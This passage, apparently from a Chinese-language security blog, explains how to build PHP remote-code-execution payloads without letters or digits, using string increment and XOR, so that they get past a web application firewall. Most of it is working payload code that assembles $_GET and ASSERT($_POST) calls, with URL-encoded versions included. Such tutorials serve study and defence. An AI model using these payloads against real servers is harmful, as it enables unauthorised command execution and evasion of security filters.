class="comment">//两个短杠赋值为空</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>];<span class="comment">//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//b</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//c</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//d</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//e</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">//E  把两个短杠赋值为E</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//F  一个短杠继续自增</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//G </span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">// GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//H 此处一个短杠继续自增，为H</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//I</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//J</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//k</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//L</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//M</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//P</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//S</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//T</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">// GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span></span><br><span class="line">$&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>&#125;[_]($&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>&#125;[__]); <span class="comment">// 进行拼接，$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span></span><br><span class="line"></span><br><span class="line">url编码后：</span><br><span class="line">%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">5</span>b%<span class="number">5</span>d.%<span class="number">5</span>b%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">5</span>b%<span class="number">27</span>%<span class="number">27</span>%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__.%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_.%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__.%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">27</span>_%<span class="number">27</span>.%<span class="number">24</span>__%<span class="number">7</span>d%<span class="number">5</span>b_%<span class="number">5</span>d(%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">27</span>_%<span class="number">27</span>.%<span class="number">24</span>__%<span class="number">7</span>d%<span class="number">5</span>b__%<span class="number">5</span>d)%<span class="number">3</span>b</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br><span class="line"></span><br><span class="line">url编码后：</span><br><span class="line">%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">5</span>b%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">40</span>%<span class="number">22</span>%<span class="number">24</span>_%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">5</span>b%<span class="number">27</span>!%<span class="number">27</span>%<span class="number">3</span>d%<span class="number">3</span>d%<span class="number">27</span>%<span class="number">40</span>%<span class="number">27</span>%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>___%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>____%<span class="number">3</span>d%<span class="number">27</span>_%<span class="number">27</span>%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>b%<span class="number">24</span>___(%<span class="number">24</span>_%<span class="number">5</span>b_%<span class="number">5</span>d)%<span class="number">3</span>b</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>第二个payload需要PHP小于7的版本，因为在PHP7，assert不再可以被动态调用</p></blockquote><h2 id="异或："><a href="#异或：" class="headerlink" title="异或："></a>异或：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);  <span class="comment">//新创建一个文件，也就是rce_or.txt，给他写的权限</span></span><br><span class="line"><span class="variable">$contents</span>=<span 